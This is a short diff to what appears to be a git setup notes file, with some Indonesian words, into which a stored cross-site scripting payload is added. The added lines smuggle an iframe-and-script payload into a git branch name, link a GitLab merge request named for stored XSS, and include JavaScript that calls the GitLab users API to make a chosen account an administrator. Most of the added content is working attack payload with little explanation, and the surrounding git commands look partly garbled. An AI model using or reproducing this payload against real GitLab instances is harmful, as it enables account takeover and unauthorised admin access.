@@ -16,4 +16,13 @@ git branch -M main
 git remote add Origin https://github.com/rio-s- molana/rio-s-molana.git
  git push -u asal main
 	
-*.newrelic.com
+<iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>, misalnya,git push origin master:"'><iframe/srcdoc='<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>"
+
+https://gitlab.com/yvvdwf/store-xss-merge-request/-/merge_requests/1
+var user_id=5212593;
+console.log(`Set user ${user_id} to admin`);
+
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = console.log;
+xhttp.open("PUT", `/api/v4/users/${user_id}?admin=true`, true);
+xhttp.send();
